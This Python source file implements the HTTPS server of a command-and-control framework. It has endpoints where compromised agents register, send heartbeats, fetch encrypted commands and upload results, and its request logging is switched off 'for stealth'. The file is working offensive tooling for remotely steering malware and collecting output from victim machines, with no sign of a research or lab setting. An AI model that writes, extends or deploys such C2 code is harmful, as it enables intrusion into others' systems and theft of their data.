import http.server
import ssl
import json
import uuid
import threading
import logging
from http import HTTPStatus
from urllib.parse import urlparse, parse_qs

from c2.secure_configs.token_manager import verify_jwt_token
from c2.utils.encryption import decrypt_payload, encrypt_payload
from c2.utils.endpoint_rotation import get_current_endpoint
from c2.utils.telemetry_logger import log_event
from c2.database.command_store import fetch_next_command, store_result

ACTIVE_SESSIONS = {}
COMMAND_QUEUE = {}

logger = logging.getLogger("http_c2")
logger.setLevel(logging.INFO)


class HTTPCommandControlHandler(http.server.BaseHTTPRequestHandler):
    def _authenticate(self):
        token = self.headers.get("Authorization", "").replace("Bearer ", "")
        return verify_jwt_token(token)

    def _parse_post_data(self):
        content_length = int(self.headers.get("Content-Length", 0))
        raw_data = self.rfile.read(content_length)
        return json.loads(raw_data)

    def do_POST(self):
        if not self._authenticate():
            self.send_error(HTTPStatus.UNAUTHORIZED, "Unauthorized")
            return

        path = urlparse(self.path).path
        client_ip = self.client_address[0]
        try:
            data = self._parse_post_data()

            if path == "/register":
                agent_id = str(uuid.uuid4())
                ACTIVE_SESSIONS[agent_id] = {"ip": client_ip, "meta": data}
                log_event("agent_registered", agent_id, data)
                self._respond(200, {"agent_id": agent_id})

            elif path == "/heartbeat":
                agent_id = data["agent_id"]
                log_event("heartbeat", agent_id, data)
                self._respond(200, {"status": "ok"})

            elif path == "/fetch":
                agent_id = data["agent_id"]
                cmd = fetch_next_command(agent_id)
                encrypted = encrypt_payload(cmd)
                self._respond(200, {"command": encrypted})

            elif path == "/submit":
                agent_id = data["agent_id"]
                output = decrypt_payload(data["result"])
                store_result(agent_id, output)
                log_event("result_received", agent_id, {"size": len(output)})
                self._respond(200, {"status": "received"})

            else:
                self.send_error(HTTPStatus.NOT_FOUND)

        except Exception as e:
            logger.exception("Handler error")
            self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, str(e))

    def _respond(self, code, payload):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(payload).encode("utf-8"))

    def log_message(self, format, *args):
        return  # Disable default logging for stealth


def start_http_c2_server(host="0.0.0.0", port=443, use_ssl=True, certfile="cert.pem", keyfile="key.pem"):
    endpoint = get_current_endpoint()
    server = http.server.HTTPServer((host, port), HTTPCommandControlHandler)
    if use_ssl:
        server.socket = ssl.wrap_socket(server.socket, certfile=certfile, keyfile=keyfile, server_side=True)
    logger.info(f"[+] HTTP C2 Server running at {host}:{port} endpoint: {endpoint}")
    threading.Thread(target=server.serve_forever, daemon=True).start()
